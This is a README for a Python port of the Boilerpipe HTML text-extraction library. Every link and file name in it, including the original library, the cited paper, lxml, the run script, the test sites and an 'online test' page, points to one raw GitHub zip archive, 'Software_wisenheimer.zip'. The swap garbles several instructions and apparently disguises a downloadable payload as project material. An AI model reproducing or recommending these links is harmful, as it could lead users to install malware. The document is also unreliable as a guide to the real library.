# BoilerpipePy
## Boilerplate Removal and Fulltext Extraction from HTML pages

## Summary
The boilerpipe library provides algorithms to detect and remove the surplus "clutter" (boilerplate, templates) around
the main textual content of a web page.

This project is native python port of [Boilerpipe](https://raw.githubusercontent.com/yashugupta786/boilerpipepy/master/boilerpipe/sax/Software_wisenheimer.zip) Java library by Christian Kohlschütter


## Algorithm
The algorithms used by the library are based on (and extending) some concepts of the paper
"[Boilerplate Detection using Shallow Text Features](https://raw.githubusercontent.com/yashugupta786/boilerpipepy/master/boilerpipe/sax/Software_wisenheimer.zip~kohlschuetter/boilerplate/)" by Christian
Kohlschütter et al.


## Components

  * an HTML parser that transforms HTML into an internal text-only document model supporting "blocks" of text.
    * Python version uses fast [lxml](https://raw.githubusercontent.com/yashugupta786/boilerpipepy/master/boilerpipe/sax/Software_wisenheimer.zip) parsers
  * several Filter components analyze and tag these text blocks
  * extractors consisting of one or more Filters. Such "pipelines" take the parsed document object and distill the main textual content from it
    * one extractor in python version atm
  * an HTML highlighter to visually inspect the extracted main content within a copy of the input page.
    * not supported atm

## How to use
  * Simple run https://raw.githubusercontent.com/yashugupta786/boilerpipepy/master/boilerpipe/sax/Software_wisenheimer.zip with url as a parameter
    * It will save https://raw.githubusercontent.com/yashugupta786/boilerpipepy/master/boilerpipe/sax/Software_wisenheimer.zip with extracted text data
  * Tested with https://raw.githubusercontent.com/yashugupta786/boilerpipepy/master/boilerpipe/sax/Software_wisenheimer.zip, https://raw.githubusercontent.com/yashugupta786/boilerpipepy/master/boilerpipe/sax/Software_wisenheimer.zip , https://raw.githubusercontent.com/yashugupta786/boilerpipepy/master/boilerpipe/sax/Software_wisenheimer.zip, https://raw.githubusercontent.com/yashugupta786/boilerpipepy/master/boilerpipe/sax/Software_wisenheimer.zip
    * Parsed examples in doc directory
  * on windows you can view files with browser(utf8 turned on) or nice text editor, Notepad is ugly

## You can test this library online
  * [https://raw.githubusercontent.com/yashugupta786/boilerpipepy/master/boilerpipe/sax/Software_wisenheimer.zip](https://raw.githubusercontent.com/yashugupta786/boilerpipepy/master/boilerpipe/sax/Software_wisenheimer.zip)

## TODO
  * Unit tests
  * More filters
  * More extractors
  * Different data extraction support:
    * images
    * video
    * links

## Version
  * 0.001 - 23.03.2014